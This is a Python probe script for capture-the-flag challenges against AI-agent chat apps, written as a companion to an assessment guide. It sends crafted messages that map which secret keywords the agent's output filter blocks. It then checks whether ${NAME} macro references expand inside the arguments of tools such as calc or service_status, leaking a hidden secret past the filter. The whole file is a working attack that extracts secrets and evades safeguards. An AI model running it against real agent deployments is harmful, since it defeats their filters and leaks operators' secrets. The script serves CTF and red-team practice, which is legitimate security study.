#!/usr/bin/env python3
"""
Reusable side-channel exfil probe for hardened, rule-based "AI agent" CTF apps
(Flask/Express chat assistants with a signed session cookie, tool gating, and a
secret held in a macro/template variable). Companion to
references/blackbox-agent-ctf-assessment.md (steps 6-7).

What it does (no guessing unlock words):
  1. Probes the output-filter KEYWORD set: which secret-words trip `refused_secret`.
  2. Tests MACRO EXPANSION into every tool that echoes its args (calc / service_status
     / uuid_gen / system_time): if `tool.args` differs from the literal `${NAME}` the
     macro expanded -> the secret leaked without being "said".

Usage:
  python3 agent-exfil-probe.py http://TARGET:PORT
The chat endpoint is assumed to be POST /api/chat with body {"message": "..."}.
Override with --endpoint if different.

Exit 0 always; prints [BLOCKED] / [SAFE] / [LEAK] lines. LEAK == win.
"""
import sys, requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8081"
ENDPOINT = sys.argv[2] if len(sys.argv) > 2 else "/api/chat"

SECRET_NAMES = ["canary","flag","token","secret","deploy","deployment",
                "deployment_token","deploy_canary","sentinel","key","pass",
                "ctf","val","data","out","id","name","host","dns","x","v","c"]

# tool -> how to embed the macro reference in a message
def build(tool, ref):
    if tool == "calc":           return f"calc({ref})"
    if tool == "service_status": return f"run service_status for region {ref}"
    return f"{tool} {ref}"

def chat(msg):
    try:
        r = requests.post(f"{BASE}{ENDPOINT}", json={"message": msg}, timeout=15)
        return r.json()
    except Exception as e:
        return {"err": str(e)}

def main():
    s = requests.Session()
    # warm a session
    chat("hi")

    print(f"[*] target {BASE}{ENDPOINT}  probing {len(SECRET_NAMES)} names\n")

    print("[*] Step 6 — output-filter keyword set (refused_secret):")
    blocked = []
    for name in SECRET_NAMES:
        d = chat(f"calc(${{{name}}})")
        if d.get("event") == "refused_secret":
            blocked.append(name)
            print(f"    [BLOCKED] {name}")
        else:
            print(f"    [SAFE]    {name}  (tool={ (d.get('tool') or {}).get('name') })")
    print(f"    -> blocked words: {blocked}\n")

    print("[*] Step 7 — macro expansion into tool args (watch tool.args):")
    leaked = False
    for tool in ["calc","service_status","uuid_gen","system_time"]:
        for name in SECRET_NAMES:
            ref = f"${{{name}}}"
            d = chat(build(tool, ref))
            t = d.get("tool") or {}
            args = t.get("args")
            if args is not None and args != ref:
                print(f"    [LEAK] {build(tool, ref)!r} -> tool.args={args!r} event={d.get('event')}")
                leaked = True
    if not leaked:
        print("    (no macro expanded — secret var is exactly the blocked name, exfil needs the gated tool)")

    print("\n[done]")

if __name__ == "__main__":
    main()
